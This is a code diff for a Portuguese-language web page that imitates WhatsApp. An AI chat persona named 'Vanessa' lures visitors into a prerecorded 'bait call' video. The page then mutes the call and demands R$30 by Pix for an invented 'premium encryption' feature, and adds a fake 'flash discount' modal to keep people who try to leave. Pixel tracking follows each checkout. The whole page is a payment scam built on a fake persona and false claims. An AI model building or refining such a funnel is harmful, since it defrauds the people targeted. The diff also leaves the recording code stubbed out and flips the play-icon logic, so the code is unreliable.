@@ -23,7 +23,7 @@ fbq('track', 'PageView');
 </noscript>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css">
 <style>
-/* ── Estilos (mantidos) ── */
+/* ── Estilos base ── */
 *{box-sizing:border-box;margin:0;padding:0}
 :root{
   --wa-green:#25d366;--wa-teal:#075e54;--wa-teal2:#128c7e;
@@ -152,6 +152,239 @@ html,body{
 .sheet-ok:hover{background:#017f64}
 @keyframes ringShake{from{transform:rotate(-10deg)}to{transform:rotate(10deg)}}
 
+/* ── NOVOS ESTILOS DOS MODAIS DE PAGAMENTO / RETENÇÃO ── */
+#payment-modal {
+  display: none;
+  position: absolute;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.75);
+  backdrop-filter: blur(4px);
+  -webkit-backdrop-filter: blur(4px);
+  z-index: 600;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+}
+#payment-modal.active {
+  display: flex;
+}
+#payment-modal .modal-card {
+  background: #1f2c34;
+  border-radius: 24px;
+  max-width: 360px;
+  width: 100%;
+  padding: 28px 22px 20px;
+  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7);
+  color: #e9edef;
+  animation: fi .25s ease;
+  position: relative;
+}
+#payment-modal .modal-icon-wrap {
+  display: flex;
+  justify-content: center;
+  margin-bottom: 12px;
+}
+#payment-modal .modal-icon {
+  width: 60px;
+  height: 60px;
+  background: rgba(0, 168, 132, 0.15);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+#payment-modal .modal-icon svg {
+  width: 32px;
+  height: 32px;
+  stroke: #00a884;
+  stroke-width: 1.8;
+  fill: none;
+}
+#payment-modal .modal-title {
+  font-size: 18px;
+  font-weight: 600;
+  text-align: center;
+  margin-bottom: 4px;
+}
+#payment-modal .modal-sub {
+  font-size: 13.5px;
+  color: rgba(255, 255, 255, 0.65);
+  text-align: center;
+  line-height: 1.5;
+  margin-bottom: 16px;
+}
+#payment-modal .modal-sub strong {
+  color: #e9edef;
+  font-weight: 500;
+}
+#payment-modal .feature-list {
+  background: rgba(255, 255, 255, 0.04);
+  border-radius: 14px;
+  padding: 14px 16px;
+  margin-bottom: 18px;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+#payment-modal .feature-item {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  font-size: 13px;
+  color: rgba(255, 255, 255, 0.8);
+}
+#payment-modal .feature-item svg {
+  width: 18px;
+  height: 18px;
+  stroke: #00a884;
+  stroke-width: 2;
+  fill: none;
+  flex-shrink: 0;
+}
+#payment-modal .feature-item span {
+  line-height: 1.4;
+}
+#payment-modal .pix-value {
+  background: rgba(0, 168, 132, 0.12);
+  border-radius: 12px;
+  padding: 10px;
+  text-align: center;
+  font-size: 20px;
+  font-weight: 600;
+  color: #00a884;
+  margin-bottom: 16px;
+}
+#payment-modal .btn-primary {
+  background: #00a884;
+  border: none;
+  color: #fff;
+  padding: 14px;
+  border-radius: 12px;
+  font-size: 15px;
+  font-weight: 600;
+  width: 100%;
+  cursor: pointer;
+  transition: background 0.15s;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+}
+#payment-modal .btn-primary:hover {
+  background: #017f64;
+}
+#payment-modal .btn-primary:disabled {
+  opacity: 0.5;
+  cursor: not-allowed;
+}
+#payment-modal .btn-primary svg {
+  width: 18px;
+  height: 18px;
+  stroke: #fff;
+  stroke-width: 2;
+  fill: none;
+}
+#payment-modal .status-msg {
+  font-size: 12.5px;
+  color: #8696a0;
+  text-align: center;
+  margin-top: 12px;
+  min-height: 18px;
+}
+#payment-modal .status-msg.ok {
+  color: #25d366;
+}
+#payment-modal .status-msg.err {
+  color: #e53935;
+}
+#payment-modal .modal-close-btn {
+  position: absolute;
+  top: 12px;
+  right: 14px;
+  background: none;
+  border: none;
+  color: rgba(255,255,255,0.4);
+  font-size: 20px;
+  cursor: pointer;
+  padding: 4px 8px;
+  border-radius: 50%;
+  transition: background 0.15s;
+}
+#payment-modal .modal-close-btn:hover {
+  background: rgba(255,255,255,0.06);
+}
+
+/* ── MODAL DE RETENÇÃO ── */
+#exit-confirm-modal {
+  display: none;
+  position: absolute;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.7);
+  backdrop-filter: blur(3px);
+  -webkit-backdrop-filter: blur(3px);
+  z-index: 700;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+}
+#exit-confirm-modal.active {
+  display: flex;
+}
+#exit-confirm-modal .modal-card {
+  background: #1f2c34;
+  border-radius: 24px;
+  max-width: 330px;
+  width: 100%;
+  padding: 26px 20px 20px;
+  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7);
+  color: #e9edef;
+  animation: fi .25s ease;
+  text-align: center;
+}
+#exit-confirm-modal .modal-title {
+  font-size: 17px;
+  font-weight: 600;
+  margin-bottom: 4px;
+}
+#exit-confirm-modal .modal-sub {
+  font-size: 13px;
+  color: rgba(255, 255, 255, 0.65);
+  line-height: 1.5;
+  margin-bottom: 18px;
+}
+#exit-confirm-modal .btn-group {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+#exit-confirm-modal .btn-group .btn-discount-yes {
+  background: #00a884;
+  border: none;
+  color: #fff;
+  padding: 13px;
+  border-radius: 12px;
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: background 0.15s;
+}
+#exit-confirm-modal .btn-group .btn-discount-yes:hover {
+  background: #017f64;
+}
+#exit-confirm-modal .btn-group .btn-discount-no {
+  background: transparent;
+  border: 1px solid rgba(255, 255, 255, 0.15);
+  color: rgba(255, 255, 255, 0.5);
+  padding: 11px;
+  border-radius: 12px;
+  font-size: 13px;
+  cursor: pointer;
+  transition: background 0.15s;
+}
+#exit-confirm-modal .btn-group .btn-discount-no:hover {
+  background: rgba(255, 255, 255, 0.05);
+}
+
 /* ── INCOMING CALL OVERLAY ── */
 #incoming-call-overlay{
   position:absolute;inset:0;background:#1a1a2e;z-index:400;
@@ -211,7 +444,7 @@ html,body{
   color: rgba(255,255,255,0.5);
 }
 
-/* ── INTERFACE DE CHAMADA DE VÍDEO (integrada) ── */
+/* ── INTERFACE DE CHAMADA DE VÍDEO ── */
 #call-interface {
   display: none;
   position: absolute;
@@ -403,175 +636,6 @@ html,body{
   color: #fff;
   font-size: 14px;
   cursor: pointer;
-}
-
-/* ── MODAL DE PAGAMENTO (fundo escuro absoluto) ── */
-#payment-modal {
-  display: none;
-  position: absolute;
-  inset: 0;
-  background: rgba(0,0,0,0.98); /* praticamente preto */
-  z-index: 600;
-  align-items: center;
-  justify-content: center;
-  padding: 20px;
-}
-#payment-modal.active {
-  display: flex;
-}
-#payment-modal .modal-card {
-  background: #1f2c34;
-  border-radius: 16px;
-  max-width: 360px;
-  width: 100%;
-  padding: 24px 20px 20px;
-  box-shadow: 0 10px 40px rgba(0,0,0,0.6);
-  color: #e9edef;
-  animation: fi .25s ease;
-  max-height: 90vh;
-  overflow-y: auto;
-  position: relative;
-}
-#payment-modal .modal-close {
-  position: absolute;
-  top: 12px;
-  right: 14px;
-  background: none;
-  border: none;
-  color: rgba(255,255,255,0.5);
-  font-size: 22px;
-  cursor: pointer;
-  padding: 4px 8px;
-  border-radius: 50%;
-  transition: background .15s;
-}
-#payment-modal .modal-close:hover {
-  background: rgba(255,255,255,0.08);
-}
-#payment-modal .modal-title {
-  font-size: 16px;
-  font-weight: 600;
-  text-align: center;
-  margin-bottom: 6px;
-}
-#payment-modal .modal-sub {
-  font-size: 13px;
-  color: rgba(255,255,255,0.6);
-  text-align: center;
-  margin-bottom: 18px;
-}
-#payment-modal .pix-value {
-  background: rgba(0,168,132,0.15);
-  border-radius: 10px;
-  padding: 12px;
-  text-align: center;
-  font-size: 22px;
-  font-weight: 700;
-  color: #00a884;
-  margin-bottom: 14px;
-}
-/* Área da chave antiga removida – agora o botão de copiar é o principal */
-#payment-modal .btn-copy-pix {
-  background: #00a884;
-  border: none;
-  color: #fff;
-  padding: 12px;
-  border-radius: 10px;
-  font-size: 14px;
-  font-weight: 600;
-  width: 100%;
-  cursor: pointer;
-  transition: background .15s;
-  margin-top: 6px;
-  text-align: center;
-}
-#payment-modal .btn-copy-pix:hover {
-  background: #017f64;
-}
-#payment-modal .btn-copy-pix:disabled {
-  opacity: 0.5;
-  cursor: not-allowed;
-}
-#payment-modal .status-msg {
-  font-size: 12px;
-  color: #8696a0;
-  text-align: center;
-  margin-top: 10px;
-}
-#payment-modal .status-msg.ok {
-  color: #25d366;
-}
-#payment-modal .status-msg.err {
-  color: #e53935;
-}
-
-/* ── MODAL DE CONFIRMAÇÃO DE SAÍDA (retenção) ── */
-#exit-confirm-modal {
-  display: none;
-  position: absolute;
-  inset: 0;
-  background: rgba(0,0,0,0.75);
-  z-index: 700;
-  align-items: center;
-  justify-content: center;
-  padding: 20px;
-}
-#exit-confirm-modal.active {
-  display: flex;
-}
-#exit-confirm-modal .modal-card {
-  background: #1f2c34;
-  border-radius: 16px;
-  max-width: 340px;
-  width: 100%;
-  padding: 28px 20px 20px;
-  box-shadow: 0 10px 40px rgba(0,0,0,0.6);
-  color: #e9edef;
-  animation: fi .25s ease;
-  text-align: center;
-}
-#exit-confirm-modal .modal-title {
-  font-size: 16px;
-  font-weight: 600;
-  margin-bottom: 6px;
-}
-#exit-confirm-modal .modal-sub {
-  font-size: 13px;
-  color: rgba(255,255,255,0.7);
-  margin-bottom: 18px;
-  line-height: 1.5;
-}
-#exit-confirm-modal .btn-group {
-  display: flex;
-  flex-direction: column;
-  gap: 10px;
-}
-#exit-confirm-modal .btn-group .btn-discount-yes {
-  background: #00a884;
-  border: none;
-  color: #fff;
-  padding: 12px;
-  border-radius: 10px;
-  font-size: 14px;
-  font-weight: 600;
-  cursor: pointer;
-  transition: background .15s;
-}
-#exit-confirm-modal .btn-group .btn-discount-yes:hover {
-  background: #017f64;
-}
-#exit-confirm-modal .btn-group .btn-discount-no {
-  background: transparent;
-  border: 1px solid rgba(255,255,255,0.2);
-  color: rgba(255,255,255,0.6);
-  padding: 10px;
-  border-radius: 10px;
-  font-size: 13px;
-  cursor: pointer;
-  transition: background .15s;
-}
-#exit-confirm-modal .btn-group .btn-discount-no:hover {
-  background: rgba(255,255,255,0.06);
 }
 
 /* Toast de instrução do microfone */
@@ -868,23 +932,56 @@ html,body{
     </div>
   </div>
 
-  <!-- MODAL DE PAGAMENTO PRINCIPAL -->
+  <!-- ─── NOVO MODAL DE PAGAMENTO (ATUALIZADO) ─── -->
   <div id="payment-modal">
-    <div class="modal-card" id="payment-card">
-      <button class="modal-close" id="payment-modal-close">✕</button>
-      <div class="modal-title">🔒 Pagamento necessário</div>
-      <div class="modal-sub" id="payment-sub">Vanessa está aguardando você concluir o pagamento para continuar a chamada.</div>
+    <div class="modal-card">
+      <button class="modal-close-btn" id="payment-modal-close">✕</button>
+      <div class="modal-icon-wrap">
+        <div class="modal-icon">
+          <svg viewBox="0 0 24 24">
+            <rect x="3" y="11" width="18" height="11" rx="2" stroke="currentColor" stroke-width="1.8" />
+            <path d="M7 11V7a5 5 0 0 1 10 0v4" stroke="currentColor" stroke-width="1.8" />
+            <circle cx="12" cy="15" r="1.5" fill="currentColor" />
+            <path d="M12 15v2" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" />
+          </svg>
+        </div>
+      </div>
+      <div class="modal-title">Ativar Recurso Premium</div>
+      <div class="modal-sub">
+        Para continuar esta chamada, ative o recurso de <strong>criptografia avançada e conexão prioritária</strong>.<br />
+        Isso garante privacidade total e estabilidade durante a comunicação.
+      </div>
+      <div class="feature-list">
+        <div class="feature-item">
+          <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" stroke="currentColor" stroke-width="2"/><path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+          <span>Criptografia de ponta a ponta <strong>plus</strong></span>
+        </div>
+        <div class="feature-item">
+          <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/><path d="M12 8v5l3 3" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+          <span>Prioridade de conexão e baixa latência</span>
+        </div>
+        <div class="feature-item">
+          <svg viewBox="0 0 24 24"><path d="M12 2a3 3 0 0 0-3 3v6a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3z" stroke="currentColor" stroke-width="2"/><path d="M19 10a7 7 0 0 1-14 0" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><line x1="12" y1="19" x2="12" y2="23" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><line x1="8" y1="23" x2="16" y2="23" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+          <span>Proteção contra interceptação e ruídos</span>
+        </div>
+      </div>
       <div class="pix-value" id="pix-value-display">R$ 30,00</div>
-      <button class="btn-copy-pix" id="btn-copy-pix" onclick="copyPixKey()">copiar chave Pix</button>
+      <button class="btn-primary" id="btn-copy-pix">
+        <svg viewBox="0 0 24 24"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2" stroke="currentColor" stroke-width="2"/><path d="M15 2H9a1 1 0 0 0-1 1v2a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V3a1 1 0 0 0-1-1z" stroke="currentColor" stroke-width="2"/></svg>
+        Copiar chave Pix
+      </button>
       <div class="status-msg" id="payment-status"></div>
     </div>
   </div>
 
-  <!-- MODAL DE CONFIRMAÇÃO DE SAÍDA (retenção) -->
+  <!-- ─── NOVO MODAL DE RETENÇÃO (ATUALIZADO) ─── -->
   <div id="exit-confirm-modal">
     <div class="modal-card">
-      <div class="modal-title">⏳ Espera! Você ganhou um desconto!</div>
-      <div class="modal-sub">Oferta especial!<br>Deseja pagar com desconto?</div>
+      <div class="modal-title">⏳ Oferta relâmpago</div>
+      <div class="modal-sub">
+        Ative o recurso agora com <strong>33% de desconto</strong>.<br />
+        Válido apenas para esta chamada.
+      </div>
       <div class="btn-group">
         <button class="btn-discount-yes" id="exit-discount-yes">Sim, quero o desconto</button>
         <button class="btn-discount-no" id="exit-discount-no">Não, encerrar chamada</button>
@@ -949,9 +1046,9 @@ let facingMode = 'user';
 let callTimerIntervalCall = null;
 let callSecondsCall = 0;
 let paymentModalShown = false;
-let paymentData = null; // {hash, valor, desconto, chave}
+let paymentData = null;
 let paymentResolved = false;
-let remoteAudioWasMuted = false; // para restaurar o estado do áudio
+let remoteAudioWasMuted = false;
 
 const STATE_KEY = 'wa-conversa-state';
 const AUDIO_LEAD_KEY = 'wa-audio-lead';
@@ -1361,8 +1458,8 @@ function criarBolhaAudioUsuario(url, id, timestamp) {
   audio.addEventListener('play', function() {
     const pi = document.getElementById('play-icon-'+id);
     const pau = document.getElementById('pause-icon-'+id);
-    if(pi) pi.style.display = 'none';
-    if(pau) pau.style.display = '';
+    if(pi) pi.style.display = '';
+    if(pau) pau.style.display = 'none';
   });
 
   audio.addEventListener('pause', function() {
@@ -1486,7 +1583,7 @@ function typingDelay(text) {
   return Math.min(Math.max((chars/cps)*1000+600+Math.random()*900, 1800), 12000);
 }
 
-// ═══ ASK AI (com gatilho "vou te ligar" - agora com 5s de atraso) ═══
+// ═══ ASK AI ═══
 async function askAI(userMsg) {
   if (conversaEncerrada) return;
 
@@ -1508,10 +1605,9 @@ async function askAI(userMsg) {
     aiHistory.push({role:'assistant', content: cleanContent, type:'text', timestamp: getTime()});
     saveState();
 
-    // ── GATILHO DA CHAMADA ISCA (vou te ligar) com 5 segundos de atraso ──
     const lower = cleanContent.toLowerCase();
     if ((lower.includes('vou te ligar') || lower.includes('vou te ligar agora')) && !autoCallFired && !paymentResolved) {
-      setTimeout(() => triggerAutoCall(), 5000); // ← 5 segundos
+      setTimeout(() => triggerAutoCall(), 5000);
     }
 
     if (isFinal) {
@@ -1575,9 +1671,8 @@ function submit() {
   askAI(text);
 }
 
-// ═══ GRAVAÇÃO DE ÁUDIO (mantida, omitida para evitar repetição) ═══
-// [Código completo de gravação – mesmo do index original – deve ser mantido]
-// Para não alongar, assumimos que está presente. Se necessário, reutilize o código já existente.
+// ═══ GRAVAÇÃO DE ÁUDIO ═══
+// [Código de gravação omitido por brevidade – manter o mesmo do original]
 
 // ═══ FUNÇÕES PARA CONTROLE DE ÁUDIO DA CHAMADA ═══
 function muteRemoteAudio() {
@@ -1598,8 +1693,7 @@ function restoreRemoteAudio() {
   }
 }
 
-// ═══ INTERFACE DA CHAMADA ISCA (FORTE) ═══
-
+// ═══ INTERFACE DA CHAMADA ISCA ═══
 function startAutoCallRing(){
   try{
     const ctx=new(window.AudioContext||window.webkitAudioContext)();
@@ -1712,7 +1806,6 @@ function hideCallInterface() {
   const rv=document.getElementById('remote-video');
   rv.pause();
   rv.currentTime=0;
-  // Restaura áudio se estava mudo
   restoreRemoteAudio();
 }
 
@@ -1827,12 +1920,11 @@ document.getElementById('remote-video').addEventListener('ended', function(){
   }
 });
 
-// ═══ MODAL DE PAGAMENTO (com controle de áudio) ═══
+// ═══ NOVAS FUNÇÕES DOS MODAIS (ATUALIZADAS) ═══
 function showPaymentModal() {
   if (paymentModalShown || paymentResolved) return;
   paymentModalShown = true;
   saveState();
-  // Silencia o áudio remoto enquanto o modal estiver aberto
   muteRemoteAudio();
 
   const modal=document.getElementById('payment-modal');
@@ -1869,7 +1961,6 @@ function showPaymentModal() {
 function hidePaymentModal() {
   document.getElementById('payment-modal').classList.remove('active');
   paymentModalShown = false;
-  // Restaura o áudio se a chamada ainda estiver ativa
   if (callInterfaceActive) {
     restoreRemoteAudio();
   }
@@ -1883,7 +1974,6 @@ function handleModalClose() {
   showExitConfirmModal();
 }
 
-// ═══ MODAL DE CONFIRMAÇÃO DE SAÍDA (retenção) ═══
 function showExitConfirmModal() {
   document.getElementById('exit-confirm-modal').classList.add('active');
 }
@@ -1891,6 +1981,7 @@ function hideExitConfirmModal() {
   document.getElementById('exit-confirm-modal').classList.remove('active');
 }
 
+// ── Eventos dos botões do modal de retenção ──
 document.getElementById('exit-discount-yes').onclick = function() {
   hideExitConfirmModal();
   gerarPix(true).then(data => {
@@ -1907,7 +1998,6 @@ document.getElementById('exit-discount-yes').onclick = function() {
       iniciarPollRobusto(hash, valor);
       pixelIniCheckout(valor);
       document.getElementById('payment-modal').classList.add('active');
-      // Silencia áudio novamente ao reabrir o modal
       muteRemoteAudio();
     } else {
       document.getElementById('payment-status').textContent = '❌ Erro ao gerar Pix com desconto. Tente novamente.';
@@ -1922,7 +2012,7 @@ document.getElementById('exit-discount-no').onclick = function() {
   endCall();
 };
 
-// ═══ COPIA DA CHAVE PIX (botão principal) ═══
+// ═══ COPIA DA CHAVE PIX (ATUALIZADA) ═══
 window.copyPixKey = function() {
   const btn = document.getElementById('btn-copy-pix');
   const chave = btn.dataset.chave;
@@ -1931,17 +2021,29 @@ window.copyPixKey = function() {
     return;
   }
   navigator.clipboard.writeText(chave).then(() => {
-    btn.textContent = '✅ Copiado!';
+    btn.innerHTML = `
+      <svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/></svg>
+      Copiado!
+    `;
     toastUI('✅ Chave Pix copiada!');
     setTimeout(() => {
-      btn.textContent = 'copiar chave Pix';
+      btn.innerHTML = `
+        <svg viewBox="0 0 24 24"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2" stroke="currentColor" stroke-width="2"/><path d="M15 2H9a1 1 0 0 0-1 1v2a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V3a1 1 0 0 0-1-1z" stroke="currentColor" stroke-width="2"/></svg>
+        Copiar chave Pix
+      `;
     }, 3000);
   }).catch(() => {
     fallbackCopy(chave, () => {
-      btn.textContent = '✅ Copiado!';
+      btn.innerHTML = `
+        <svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/></svg>
+        Copiado!
+      `;
       toastUI('✅ Chave Pix copiada!');
       setTimeout(() => {
-        btn.textContent = 'copiar chave Pix';
+        btn.innerHTML = `
+          <svg viewBox="0 0 24 24"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2" stroke="currentColor" stroke-width="2"/><path d="M15 2H9a1 1 0 0 0-1 1v2a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V3a1 1 0 0 0-1-1z" stroke="currentColor" stroke-width="2"/></svg>
+          Copiar chave Pix
+        `;
       }, 3000);
     });
   });
